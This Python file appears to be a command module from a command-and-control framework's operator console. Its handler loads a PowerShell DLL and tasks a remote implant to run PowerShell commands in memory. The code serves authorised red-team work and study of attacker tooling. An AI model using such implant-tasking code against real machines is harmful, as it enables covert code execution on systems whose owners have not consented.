from core.state import send_task
from core.state import TaskCode
from core.config import Paths
from core import srdi
from core import logging
from core import state

def finish_powershell(response, cache):
    if not response.success:
        logging.error("Task Failed")
        return False
    
    if 'load' in cache:
        logging.success("Loaded powershell")
    else:
        logging.print(response.return_data.decode())

def do_powershell(self, command):
    """
    Execute Powershell commands in memory (use `load` first)

    Syntax:
        powershell load
        powershell Get-Host
    """

    if not command:
        logging.print(self.do_powershell.__doc__)
        return

    if command == "load":      
        assembly = Paths.DLLs + 'Powershell.dll'

        try:
            assembly_bytes = open(assembly, 'rb').read()
        except:
            logging.error("Failed to read '{0}'".format(assembly))
            return

        send_task(TaskCode.Powershell, argument1 = command, argument2 = assembly_bytes, cache = {'load': True})

    else:
        send_task(TaskCode.Powershell, argument1 = command)
